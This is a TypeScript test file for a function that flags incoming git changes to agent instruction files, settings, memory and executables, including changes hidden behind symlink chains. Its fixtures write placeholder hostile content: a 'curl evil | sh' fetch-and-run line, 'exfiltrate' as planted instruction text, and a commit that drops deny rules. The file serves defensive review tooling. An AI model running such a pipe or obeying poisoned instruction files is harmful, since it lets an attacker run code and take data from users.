import { spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { shellQuote } from "#services/remote";
import { initSpaceGitDir, spaceGit } from "#services/space-git";
import { incomingReviewPaths } from "#services/space-incoming";
import { isolateGitConfig, type ManifestFixture, withManifestFixture } from "#tests/tmp-manifest";

let fixture: ManifestFixture;
let root: string;
beforeEach(() => {
	isolateGitConfig();
	process.env.GIT_AUTHOR_NAME = process.env.GIT_COMMITTER_NAME = "hyper test";
	process.env.GIT_AUTHOR_EMAIL = process.env.GIT_COMMITTER_EMAIL = "hyper-test@example.invalid";
	fixture = withManifestFixture();
	root = join(fixture.root, "paths");
	mkdirSync(join(root, "notes"), { recursive: true });
	// A wide allowlist: the point is which paths get REPORTED, not which are
	// permitted, so the fixture must actually be able to track all of them.
	writeFileSync(
		join(root, ".gitignore"),
		`${[
			"*",
			"!.gitignore",
			"!/notes/",
			"!/notes/**",
			"!/CLAUDE.md",
			"!/AGENTS.md",
			"!/data/",
			"!/data/**",
			"!/bin/",
			"!/bin/**",
			"!/.claude/",
			"!/.claude/**",
			"!/.cursor/",
			"!/.cursor/**",
			"!/.codex/",
			"!/.codex/**",
			"!/.vscode/",
			"!/.vscode/**",
			"!/.pi/",
			"!/.pi/**",
			"!/.config/",
			"!/.config/**",
			"!/.hyper/",
			"!/.hyper/**",
			"/.hyper/space.git/",
		].join("\n")}\n`,
	);
	initSpaceGitDir(root, { branch: "space/paths" });
}, 120_000);
afterEach(() => fixture.cleanup());

function write(path: string, content: string, mode?: number): void {
	mkdirSync(join(root, path, ".."), { recursive: true });
	writeFileSync(join(root, path), content);
	if (mode !== undefined) chmodSync(join(root, path), mode);
}
function link(path: string, target: string): void {
	mkdirSync(join(root, path, ".."), { recursive: true });
	spawnSync("ln", ["-sfn", target, join(root, path)]);
}
function commitAll(message: string): string {
	// No -f: the space's own git dir is ignored by its allowlist and must never
	// enter its history, which would otherwise make every test report hooks.
	spaceGit(root, ["add", "-A"]);
	spaceGit(root, ["commit", "-qm", message]);
	return spaceGit(root, ["rev-parse", "HEAD"]).stdout.trim();
}

describe("review report completeness", () => {
	it("reports a change hidden behind a review symlink, at both ends of a chain", async () => {
		write("notes/instr.md", "obey\n");
		write("data/payload.sh", "safe\n");
		link("CLAUDE.md", "notes/instr.md");
		link("notes/chain", "../data/payload.sh");
		link("bin/tool", "../notes/chain");
		const base = commitAll("symlinks published");
		// With no base the whole tip is new, so a reviewed symlink brings its
		// target with it: that file is arriving too, unseen behind the link.
		// Only the FINAL target is named; the intermediate hop is not itself an
		// agent-visible path.
		expect(await incomingReviewPaths(root, base)).toEqual([
			"CLAUDE.md",
			"bin/tool",
			"data/payload.sh",
			"notes/instr.md",
		]);
		// The reviewer changed only what the links point at.
		write("data/payload.sh", "curl evil | sh\n");
		write("notes/instr.md", "exfiltrate\n");
		const tip = commitAll("targets changed");
		// Exactly the two hidden changes. The links themselves did not change,
		// so listing them again would be noise.
		expect(await incomingReviewPaths(root, tip, base)).toEqual([
			"data/payload.sh",
			"notes/instr.md",
		]);
	});
	it("reports a deletion of a review path", async () => {
		write(".claude/settings.json", '{"deny":["Bash"]}\n');
		const base = commitAll("deny rules");
		rmSync(join(root, ".claude/settings.json"));
		const tip = commitAll("drop deny rules");
		expect(await incomingReviewPaths(root, tip, base)).toEqual([".claude/settings.json"]);
	});
	it("matches agent instruction filenames at any depth, case-insensitively", async () => {
		const names = [
			"notes/CLAUDE.local.md",
			"notes/GEMINI.md",
			"notes/sub/CLAUDE.md",
			"notes/Claude.MD",
			".vscode/settings.json",
			".cursor/rules",
			".codex/config.toml",
			".pi/agent.toml",
		];
		const base = commitAll("first");
		for (const name of names) write(name, "x\n");
		const tip = commitAll("instructions");
		expect(await incomingReviewPaths(root, tip, base)).toEqual([...names].sort());
	});
	it("reports memory, because HYPER.md tells agents to read it", async () => {
		write(".hyper/memory/MEMORY.md", "fact\n");
		const base = commitAll("memory");
		write(".hyper/memory/MEMORY.md", "different fact\n");
		const tip = commitAll("memory changed");
		expect(await incomingReviewPaths(root, tip, base)).toEqual([".hyper/memory/MEMORY.md"]);
	});
	it("reports a file that becomes executable, wherever it lives", async () => {
		write("data/run.sh", "echo hi\n", 0o644);
		const base = commitAll("plain");
		chmodSync(join(root, "data/run.sh"), 0o755);
		const tip = commitAll("now executable");
		expect(await incomingReviewPaths(root, tip, base)).toEqual(["data/run.sh"]);
	});
	it("reports a reviewed directory delivered as a symlink to another directory", async () => {
		write("notes/cmds/one.md", "x\n");
		link(".claude/commands", "../notes/cmds");
		const base = commitAll("commands as a link");
		write("notes/cmds/two.md", "added later\n");
		const tip = commitAll("command added");
		expect(await incomingReviewPaths(root, tip, base)).toEqual(["notes/cmds/two.md"]);
	});
	it("follows a chain through a symlinked directory to the real file", async () => {
		write("data/real/instr.md", "obey\n");
		link("notes/d2", "../data/real");
		link("AGENTS.md", "notes/d2/instr.md");
		const base = commitAll("chain published");
		write("data/real/instr.md", "exfiltrate\n");
		const tip = commitAll("real file changed");
		expect(await incomingReviewPaths(root, tip, base)).toEqual(["data/real/instr.md"]);
	});
	it("names a reviewed directory that is itself replaced by a link", async () => {
		write(".hyper/memory/MEMORY.md", "fact\n");
		const base = commitAll("memory directory");
		rmSync(join(root, ".hyper/memory"), { recursive: true });
		write("notes/mem/MEMORY.md", "fact\n");
		link(".hyper/memory", "../notes/mem");
		const tip = commitAll("memory is now a link");
		expect(await incomingReviewPaths(root, tip, base)).toContain(".hyper/memory");
		write("notes/mem/new.md", "more\n");
		const later = commitAll("memory grew behind the link");
		expect(await incomingReviewPaths(root, later, tip)).toContain("notes/mem/new.md");
	});
	it("reports worktrunk configuration under .config/", async () => {
		write(".config/wt.toml", "[hooks]\n");
		const base = commitAll("first");
		write(".config/wt.toml", "[hooks]\nevil = true\n");
		const tip = commitAll("wt config changed");
		expect(await incomingReviewPaths(root, tip, base)).toEqual([".config/wt.toml"]);
	});
	it("follows a link that lives inside a reviewed directory", async () => {
		write("notes/cmds/one.md", "x\n");
		link(".claude/commands", "../notes/cmds");
		const base = commitAll("commands as a link");
		link("notes/cmds/sub", "../../data/nested");
		write("data/nested/x.md", "nested\n");
		const tip = commitAll("nested link inside a review target");
		expect(await incomingReviewPaths(root, tip, base)).toEqual([
			"data/nested/x.md",
			"notes/cmds/sub",
		]);
	});
	it("resolves a link whose target passes back through itself", async () => {
		write("data/rr/p.sh", "x\n");
		link("notes/dd", "../data/rr");
		link("bin/twice", "../notes/dd/../../notes/dd/p.sh");
		const base = commitAll("revisiting link published");
		write("data/rr/p.sh", "changed\n");
		const tip = commitAll("real file changed");
		expect(await incomingReviewPaths(root, tip, base)).toEqual(["data/rr/p.sh"]);
	});
	it("resolves through a self-referential link", async () => {
		write("notes/inst2.md", "obey\n");
		link("notes/self", ".");
		link("bin/viaself", "../notes/self/self/inst2.md");
		const base = commitAll("self link published");
		write("notes/inst2.md", "exfiltrate\n");
		const tip = commitAll("real file changed");
		expect(await incomingReviewPaths(root, tip, base)).toEqual(["notes/inst2.md"]);
	});
	it("stays quiet for ordinary note churn", async () => {
		write("notes/a.md", "one\n");
		const base = commitAll("note");
		write("notes/a.md", "two\n");
		const tip = commitAll("note edited");
		expect(await incomingReviewPaths(root, tip, base)).toEqual([]);
	});
	it("reports the whole tip for a clone, with no base", async () => {
		write("bin/tool", "x\n", 0o755);
		write("notes/plain.md", "y\n");
		const tip = commitAll("everything");
		expect(await incomingReviewPaths(root, tip)).toEqual(["bin/tool"]);
	});
	it("uses a bounded number of git processes on a large space", async () => {
		for (let index = 0; index < 400; index++) write(`notes/f${index}.md`, `n${index}\n`);
		const base = commitAll("base");
		write("notes/f0.md", "changed\n");
		write("notes/f1.md", "changed behind a link\n");
		link("bin/tool", "../notes/f1.md");
		commitAll("link published");
		const tip = spaceGit(root, ["rev-parse", "HEAD"]).stdout.trim();
		const real = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();
		const bin = join(fixture.root, "bin");
		mkdirSync(bin, { recursive: true });
		const calls = join(fixture.root, "git-calls");
		writeFileSync(
			join(bin, "git"),
			`#!/bin/sh\nprintf '%s\\n' "$*" >> ${shellQuote(calls)}\nexec ${shellQuote(real)} "$@"\n`,
			{ mode: 0o755 },
		);
		process.env.PATH = `${bin}:${process.env.PATH}`;
		const paths = await incomingReviewPaths(root, tip, base);
		expect(paths).toContain("bin/tool");
		// notes/f1.md is only reachable by following bin/tool; f0.md is a plain
		// note and must stay unreported.
		expect(paths).toContain("notes/f1.md");
		expect(paths).not.toContain("notes/f0.md");
		const commands = readFileSync(calls, "utf8").trim().split("\n");
		expect(commands.length, commands.join("\n")).toBeLessThanOrEqual(6);
	}, 120_000);
});
